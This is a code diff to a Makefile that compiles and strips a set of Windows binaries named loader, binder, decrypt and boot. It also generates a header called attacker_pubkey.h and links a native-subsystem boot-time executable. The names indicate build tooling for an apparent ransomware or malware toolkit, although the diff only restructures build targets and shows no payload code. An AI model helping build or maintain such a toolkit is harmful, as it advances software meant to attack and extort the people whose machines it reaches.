@@ -20,9 +20,21 @@ KEYGEN_OUT = attacker_pubkey.h
 X64DIR = x64
 WIN32DIR = win32
 
-.PHONY: all clean combine combine_x64 combine_win32
+# Directories
+$(X64DIR):
+	mkdir -p $(X64DIR)
 
-all: keygen x64 win32
+$(WIN32DIR):
+	mkdir -p $(WIN32DIR)
+
+# All targets (no more circular deps)
+.PHONY: all clean combine
+
+all: keygen \
+     $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe \
+     $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe \
+     $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe \
+     $(WIN32DIR)/felty_decrypt.exe $(WIN32DIR)/felty_boot.exe
 
 # ================== Key generation ==================
 $(KEYGEN_OUT): felty_keygen.py
@@ -32,8 +44,6 @@ $(KEYGEN_OUT): felty_keygen.py
 keygen: $(KEYGEN_OUT)
 
 # ================== 64-bit Binaries ==================
-x64: $(X64DIR)/felty_loader.exe $(X64DIR)/felty_binder.exe $(X64DIR)/felty_decrypt.exe $(X64DIR)/felty_boot.exe
-
 $(X64DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(X64DIR)
 	$(CC64) $(CFLAGS_BASE) -o $@ $< $(LFLAGS64) $(WINFLAGS)
 	$(STRIP) --strip-all $@
@@ -52,8 +62,6 @@ $(X64DIR)/felty_boot.exe: $(SRC_BOOT) | $(X64DIR)
 	$(STRIP) --strip-all $@
 
 # ================== 32-bit Binaries ==================
-win32: $(WIN32DIR)/felty_loader.exe $(WIN32DIR)/felty_binder.exe $(WIN32DIR)/felty_decrypt.exe $(WIN32DIR)/felty_boot.exe
-
 $(WIN32DIR)/felty_loader.exe: $(SRC_LOADER) $(KEYGEN_OUT) | $(WIN32DIR)
 	$(CC32) $(CFLAGS_BASE) -o $@ $< $(LFLAGS32) $(WINFLAGS)
 	$(STRIP) --strip-all $@
@@ -70,13 +78,6 @@ $(WIN32DIR)/felty_decrypt.exe: $(SRC_DECRYPT) $(KEYGEN_OUT) | $(WIN32DIR)
 $(WIN32DIR)/felty_boot.exe: $(SRC_BOOT) | $(WIN32DIR)
 	$(CC32) $(CFLAGS_BASE) -nostdlib -Wl,--subsystem,native -e _NtProcessStartup@4 -o $@ $< -lntdll
 	$(STRIP) --strip-all $@
-
-# ================== Directory creation ==================
-$(X64DIR):
-	mkdir -p $(X64DIR)
-
-$(WIN32DIR):
-	mkdir -p $(WIN32DIR)
 
 # ================== Combiner ==================
 combine: combine_x64 combine_win32
